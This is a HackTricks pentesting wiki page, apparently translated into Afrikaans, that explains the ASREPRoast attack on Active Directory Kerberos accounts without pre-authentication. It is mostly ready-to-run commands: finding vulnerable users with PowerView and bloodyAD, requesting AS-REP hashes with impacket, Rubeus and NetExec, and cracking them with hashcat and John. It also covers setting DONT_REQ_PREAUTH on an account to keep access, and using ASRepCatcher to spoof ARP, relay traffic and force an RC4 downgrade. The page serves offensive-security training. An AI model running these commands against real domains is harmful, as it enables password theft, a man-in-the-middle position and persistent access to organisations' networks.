# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is 'n sekuriteitsaanval wat gebruikers uitbuit wat nie die **Kerberos pre-authentication required attribute** het nie. In wese laat hierdie kwesbaarheid aanvallers toe om namens 'n gebruiker verifikasie van die Domain Controller (DC) aan te vra sonder dat die gebruiker se wagwoord nodig is. Die DC antwoord dan met 'n boodskap wat met die gebruiker se wagwoord-afgeleide sleutel geënkripteer is, wat aanvallers offline kan probeer kraak om die gebruiker se wagwoord te ontdek.

Die belangrikste vereistes vir hierdie aanval is:

- **Ontbrekende Kerberos pre-authentication**: Teikengebruikers moet nie hierdie sekuriteitsfunksie geaktiveer hê nie.
- **Verbinding met die Domain Controller (DC)**: Aanvallers het toegang tot die DC nodig om versoeke te stuur en geënkripteerde boodskappe te ontvang.
- **Opsionele domeinrekening**: 'n Domeinrekening stel aanvallers in staat om kwesbare gebruikers doeltreffender deur LDAP-navrae te identifiseer. Sonder so 'n rekening moet aanvallers gebruikersname raai.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP-boodskap
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus versoek **RC4** by verstek, dus wys Event ID **4768** gewoonlik **preauth-tipe 0** en **ticket-enkripsietipe 0x17**. As jy **`/aes`** byvoeg (of RC4 vir die teiken gedeaktiveer is), verwag eerder **AES etypes**.<sup>[[2]](#references)</sup>

#### Vinnige one-liners (Linux)

- Enumerateer potensiële teikens eerste (bv. vanaf gelekte build paths) met Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast 'n volledige gebruikersnamelys sonder geldige creds met NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- As jy wel creds het, laat NetExec LDAP query en elke roastable account namens jou aanvra: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- As die uitvoer met **`$krb5asrep$23$`** begin, crack dit met Hashcat **`-m 18200`**. As dit met **`$krb5asrep$17$`** of **`$krb5asrep$18$`** begin, verkies John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Moenie aanvaar dat elke AS-REP roast RC4 is nie. Moderne tooling kan **RC4** (`$krb5asrep$23$`) of **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) teruggee, afhangend van die aangevraagde/onderhandelde enctype. **`hashcat -m 18200`** is vir **etype 23**, terwyl **John** `krb5asrep` direk vir **17/18/23** hanteer.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Dwing **preauth** om nie vereis te word nie vir 'n gebruiker waarvoor jy **GenericAll**-toestemmings (of toestemmings om eienskappe te skryf) het:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

'n Aanvaller kan 'n man-in-the-middle-posisie gebruik om AS-REP-pakkette vas te lê terwyl hulle oor die netwerk beweeg, sonder om daarop staat te maak dat Kerberos pre-authentication gedeaktiveer is. Dit werk dus vir alle gebruikers op die VLAN.\
As jy die verwante no-credential-truuk wil hê wat 'n **service ticket** in plaas van 'n **TGT** vanaf 'n no-preauth-prinsipaal terugstuur, sien [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) stel ons in staat om dit te doen. Die `relay`-modus is die interessante een vanuit 'n offensiewe perspektief, omdat dit **RC4** kan afdwing wanneer die client steeds **etype 23** adverteer; `listen` bly passief en vang bloot vas wat ook al deur die client/DC onderhandeld is.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Verwysings

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
